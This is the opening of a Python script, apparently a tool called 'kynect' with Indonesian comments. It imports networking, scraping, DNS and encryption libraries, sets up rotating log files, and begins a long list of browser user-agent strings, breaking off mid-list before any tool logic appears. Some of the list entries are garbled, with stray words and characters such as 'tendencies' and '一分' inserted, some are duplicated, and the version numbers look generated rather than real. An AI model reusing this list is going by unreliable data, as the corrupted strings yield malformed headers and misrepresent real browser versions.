#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup
import os
import time
import random
from tqdm import tqdm
import socket
from datetime import datetime
import psutil
import urllib.parse
from cryptography.fernet import Fernet
import json
import dns.resolver
from colorama import Fore, init
import pyfiglet
import zipfile
import webbrowser
import threading
import argparse
import sys
import re
import hashlib
import logging
import logging.handlers
import uuid
import signal
import shutil
from concurrent.futures import ThreadPoolExecutor
import threading

# Inisialisasi colorama dan pyfiglet
init()
figlet = pyfiglet.Figlet(font='slant')

# Setup logging dengan rotasi
def setup_logging(log_dir):
    os.makedirs(log_dir, exist_ok=True)
    log_file = os.path.join(log_dir, f"kynect_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")
    handler = logging.handlers.RotatingFileHandler(log_file, maxBytes=10*1024*1024, backupCount=5)
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s', handlers=[handler])
    return logging.getLogger(__name__)

logger = setup_logging("logs")

# 200 User Agents lengkap
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/90.0.818.62 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/96.0.1054.43 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/97.0.1072.55 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/98.0.1108.43 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.91 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.68 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/99.0.1150.30 Safari/537.36",
    "Mozilla/ tendencies/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.74 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.77 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.64 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.49 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537一分36 (KHTML, like Gecko) Edge/100.0.1185.29 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.63 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.90 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.98 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/101.0.1210.32 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.96 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.88 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.70 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/102.0.1245.30 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.105 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:110.0) Gecko/20100101 Firefox/110.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:111.0) Gecko/20100101 Firefox/111.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:112.0) Gecko/20100101 Firefox/112.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.57 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/103.0.1264.37 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:113.0) Gecko/20100101 Firefox/113.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64; rv:114.0) Gecko/20100101 Firefox/114.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.60 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.56 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/104.0.1293.47 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.73 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:117.0) Gecko/20100101 Firefox/117.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.84 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.58 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/105.0.1343.27 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.69 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.24 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6810.45 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6843.23 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.6876.45 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/106.0.1370.34 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.6912.34 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.6945.56 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6978.45 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/107.0.1418.24 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7012.67 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.7045.23 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.7078.45 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.7112.56 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/108.0.1462.46 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.7145.67 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.7178.23 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0",
    "Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.7201.45 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/109.0.1518.55 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.7223.56 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.7245.34 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.7267.45 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.7290.56 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/110.0.1587.41 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.7312.34 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.7334.45 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
    "Mozilla/5.0 (iPad; CPU OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.7356.56 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/111.0.1661.43 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.7378.23 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.7390.34 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.7401.45 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.7 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.7423.56 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/112.0.1722.34 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.8 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.7445.23 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.7467.45 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0",
    "Mozilla/5.0 (iPad; CPU OS 17_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.8 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/158.0.7489.56 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/113.0.1774.35 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/159.0.7512.34 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0",
